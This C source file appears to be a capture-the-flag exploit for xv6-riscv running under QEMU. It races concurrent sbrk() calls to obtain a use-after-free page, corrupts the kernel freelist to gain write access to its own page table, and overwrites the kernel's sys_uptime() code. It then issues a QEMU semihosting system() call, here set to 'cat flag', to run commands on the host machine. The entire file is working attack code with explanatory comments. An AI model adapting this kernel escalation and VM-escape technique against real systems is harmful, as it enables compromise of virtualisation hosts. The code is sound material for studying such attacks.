/**
 * @mebeim - 2024-04-08
 *
 * Compile as an xv6-riscv userspace program!
 */

#include "kernel/types.h"
#include "kernel/stat.h"
#include "kernel/fcntl.h"
#include "user/user.h"

// QEMU: semihosting/arm-compat-semi.c
#define SEMIHOST_SYS_SYSTEM 0x12
// QEMU: hw/riscv/virt.c
#define SYSCON 0x100000L
// QEMU: include/hw/misc/sifive_test.h
#define SYSCON_POWEROFF 0x5555

// How many pages to request for the race with sbrk()
#define SBRK_PAGES 1000

// Expected physical addresses of our own top level page table and the two fake
// lower level tables allocated with sbrk() at the start of main(). All 100%
// predictable.
static const uint64 my_pagetable_pa = 0x87f42000UL;
static const uint64 table_lvl1_pa   = 0x87f43000UL;
static const uint64 table_lvl0_pa   = 0x87f72000UL;

// Borrow table_lvl0 to also store the semihosting args for kernel code
static const uint64 semihost_args_pa = table_lvl0_pa + 0x800;

// sys_uptime() physaddr, fixed (readelf -s kernel | grep sys_uptime)
static const uint64 sys_uptime_pa = 0x80002d3cUL;

static inline int __attribute__((always_inline)) semihost_call(int num, uint64 args) {
	register int val asm ("a0") = num;
	register uint64 pargs asm ("a1") = args;

	asm volatile (
		".option push\n"
		".option norvc\n"
		".align 4\n"
		"slli x0, x0, 0x1f\n"
		"ebreak\n"
		"srai x0, x0, 0x7\n"
		".option pop\n"
		: "=r" (val)
		: "0" (val), "r" (pargs)
		: "memory"
	);

	return val;
}

extern char expl_end[];

static void expl(void) {
	// Call system() on the host and poweroff through QEMU syscon interface
	semihost_call(SEMIHOST_SYS_SYSTEM, semihost_args_pa);
	*(volatile uint32 *)SYSCON = SYSCON_POWEROFF;

	// Label for memcpy in main()
	asm volatile (
		".globl expl_end\n"
		"expl_end:"
	);
}

static uint64 *get_uaf_page(void) {
	int child_pid;
	int pipe_fds[2];
	char *brk;

	if (pipe(pipe_fds) == -1) {
		fprintf(2, "pipe failed\n");
		exit(1);
	}

	child_pid = fork();
	if (child_pid == -1) {
		fprintf(2, "fork failed\n");
		exit(1);
	}

	/* On sbrk() invocation, the kernel will loop calling kalloc() for each
	 * requested page. Without locking in kalloc(), it is very likely that two
	 * concurrent processes doing a large sbrk() will get some duplicated pages.
	 *
	 * After this happens, if only one of the two processes frees up the pages,
	 * the other process will have dangling virtual mappings pointing to freed
	 * memory, leading to page UAF.
	 */

	if (child_pid == 0) {
		char tmp;

		// **RACE SIDE A**
		sbrk(0x1000 * SBRK_PAGES);

		// Wait for parent to finish to avoid concurrent kfree() and kalloc().
		if (read(pipe_fds[0], &tmp, 1) != 1) {
			fprintf(2, "pipe read failed\n");
			exit(1);
		}

		// Exiting will kfree() all the previously pages allocated pages.
		exit(0);
	}

	// **RACE SIDE B**
	brk = sbrk(0x1000 * SBRK_PAGES);

	// Signal child that we are done with sbrk() so it can exit.
	if (write(pipe_fds[1], "!", 1) != 1) {
		fprintf(2, "pipe write failed\n");
		exit(1);
	}

	// Wait for child to exit and therefore kfree() all its pages.
	wait(0);

	/* Check if any of our pages were freed: pretty easy since kfree() poisons
	 * pages with 0x01 after freeing. Go backwards since pages are inserted in
	 * the freelist in reverse order so the last pages will be closer to the
	 * head, making things faster when reclaiming later.
	 */
	for (int i = SBRK_PAGES - 1; i > 0; i--) {
		uint64 *page = (uint64 *)&brk[i * 0x1000];

		if (page[1] == 0x0101010101010101UL) {
			fprintf(2, "UAF page: va=%p, next=%p\n", page, page[0]);
			return page;
		}
	}

	return 0;
}

int main(void) {
	uint64 *const table_lvl1 = (uint64 *)sbrk(0x2000);
	uint64 *const table_lvl0 = table_lvl1 + 512;
	uint64 *const semihost_args = table_lvl0 + (0x800 / 8);
	const char *const cmd = "cat flag";

	fprintf(2, "Fake lvl1 table: va=%p, expected pa=%p\n", table_lvl1, table_lvl1_pa);
	fprintf(2, "Fake lvl0 table: va=%p, expected pa=%p\n", table_lvl0, table_lvl0_pa);

	// Setup semihosting call args for later use by kernel code
	semihost_args[0] = semihost_args_pa + 0x10;
	semihost_args[1] = strlen(cmd);
	memcpy(semihost_args + 2, cmd, strlen(cmd));

	uint64 *page = get_uaf_page();
	if (!page) {
		fprintf(2, "Race for UAF page failed\n");
		return 1;
	}

	/* After getting ahold of a freed page we have UAF. Make its freelist .next
	 * pointer point into our top level page table, then start allocating memory
	 * one page at a time with sbrk(). Once we see that that the page is no
	 * longer filled with 0x01 (poisoning done by kfree()), it means that it was
	 * allocated. The next allocation will then return a page pointing at our
	 * top level page table. We can then easily write fake page table entries to
	 * reach sys_uptime().
	 *
	 * The top level page table only has two entries: one at index 0x0 for
	 * basically everything (executables are mapped starting at 0x0 and we never
	 * map as much as to require another top level entry), and one at index 0xff
	 * for the trapframe and trampoline (0x3fffffe000 and 0x3ffffff000).
	 *
	 * Since both kalloc() and uvmalloc() do a memset() on the entire page, we
	 * need to skip these entries to avoid corrupting them. In any case,
	 * mappages() will page-align the physical address before mapping without
	 * complaining.
	 */
	page[0] = my_pagetable_pa + 0x100 * 8;

	do {
		sbrk(0x1000);
	} while (page[1] == 0x0101010101010101UL);

	/* Even though kalloc() returns a misaligned physical address, sbrk() simply
	 * returns the previous brk end, which is page-aligned.
	 */
	uint64 *my_pagetable = (uint64 *)sbrk(0x1000);

	fprintf(2, "Setting up fake page table entries...\n");
	my_pagetable[1] = ((table_lvl1_pa >> 12) << 10) | 0x1; // valid
	table_lvl1[0]   = ((table_lvl0_pa >> 12) << 10) | 0x1; // valid
	table_lvl0[0]   = (((sys_uptime_pa & ~0xfffUL) >> 12) << 10) | 0x17; // valid, RW, user

	fprintf(2, "Overwriting sys_uptime()...\n");
	uint64 *const sys_uptime = (uint64 *)((1 << (12 + 9 + 9)) + (sys_uptime_pa & 0xfff));
	memcpy(sys_uptime, &expl, (uint64)expl_end - (uint64)expl);

	// Get ACE in kernel and QEMU host
	fprintf(2, "Hold your breath...\n");
	uptime();

	return 0;
}
